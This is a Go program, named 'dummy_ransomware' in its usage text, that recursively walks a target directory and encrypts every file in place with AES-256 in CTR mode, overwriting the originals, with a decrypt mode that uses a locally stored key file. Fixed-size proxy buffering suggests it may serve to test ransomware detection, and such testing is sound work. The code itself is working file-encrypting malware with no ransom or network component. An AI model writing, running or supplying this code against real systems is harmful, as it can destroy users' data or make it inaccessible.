package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// --- CONFIGURATION ---
const (
	KeyFile    = "thekey.key"
	BufferSize = 4096 // Strictly enforced via Proxy types
)

// Proxy types to hide io.ReadFrom / io.WriteTo and force manual buffering
type ProxyReader struct{ io.Reader }
type ProxyWriter struct{ io.Writer }

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: dummy_ransomware <mode (E/D)> <target_directory>")
		os.Exit(1)
	}

	mode := strings.ToUpper(os.Args[1])
	targetDir := os.Args[2]

	if mode != "E" && mode != "D" {
		fmt.Println("Invalid mode. Use E for Encrypt, D for Decrypt.")
		os.Exit(1)
	}

	key, err := getOrGenerateKey()
	if err != nil {
		fmt.Printf("Error with key: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Starting %s on %s\n", mode, targetDir)

	err = filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip paths with permission issues
		}

		// Skip logic
		if info.IsDir() || path == KeyFile || strings.HasSuffix(path, ".go") || path == "locker" || strings.HasSuffix(path, ".tmp") {
			return nil
		}

		var procErr error
		if mode == "E" {
			procErr = encryptFile(path, key)
		} else {
			procErr = decryptFile(path, key)
		}

		if procErr != nil {
			if os.IsPermission(procErr) || strings.Contains(procErr.Error(), "used by another process") {
				fmt.Printf("[!] SKIPPED (File Busy/Locked): %s\n", path)
			} else {
				fmt.Printf("[!] ERROR on %s: %v\n", path, procErr)
			}
		} else {
			fmt.Printf("[+] Processed: %s\n", path)
		}

		return nil
	})

	if err != nil {
		fmt.Printf("Walk error: %v\n", err)
	}
}

func getOrGenerateKey() ([]byte, error) {
	if _, err := os.Stat(KeyFile); os.IsNotExist(err) {
		key := make([]byte, 32)
		if _, err := io.ReadFull(rand.Reader, key); err != nil {
			return nil, err
		}
		err = os.WriteFile(KeyFile, key, 0600)
		return key, err
	}
	return os.ReadFile(KeyFile)
}

func encryptFile(filename string, key []byte) error {
	// Attempt to open with R/W permissions to check for locks
	inFile, err := os.OpenFile(filename, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer inFile.Close()

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	iv := make([]byte, aes.BlockSize)
	io.ReadFull(rand.Reader, iv)

	tmpName := filename + ".tmp"
	outFile, err := os.Create(tmpName)
	if err != nil {
		return err
	}
	defer outFile.Close()

	// Write IV first
	outFile.Write(iv)

	stream := cipher.NewCTR(block, iv)
	// Wrap the writer
	writer := &cipher.StreamWriter{S: stream, W: ProxyWriter{outFile}}

	// Copy using ProxyReader to force usage of our 4096 buffer
	buf := make([]byte, BufferSize)
	_, err = io.CopyBuffer(writer, ProxyReader{inFile}, buf)
	if err != nil {
		return err
	}

	inFile.Close()
	outFile.Close()
	os.Remove(filename)
	return os.Rename(tmpName, filename)
}

func decryptFile(filename string, key []byte) error {
	inFile, err := os.OpenFile(filename, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer inFile.Close()

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(inFile, iv); err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	tmpName := filename + ".tmp"
	outFile, err := os.Create(tmpName)
	if err != nil {
		return err
	}
	defer outFile.Close()

	stream := cipher.NewCTR(block, iv)
	// Wrap the reader
	reader := &cipher.StreamReader{S: stream, R: ProxyReader{inFile}}

	buf := make([]byte, BufferSize)
	// Using ProxyWriter to ensure the write syscalls stay at BufferSize
	_, err = io.CopyBuffer(ProxyWriter{outFile}, reader, buf)
	if err != nil {
		return err
	}

	inFile.Close()
	outFile.Close()
	os.Remove(filename)
	return os.Rename(tmpName, filename)
}
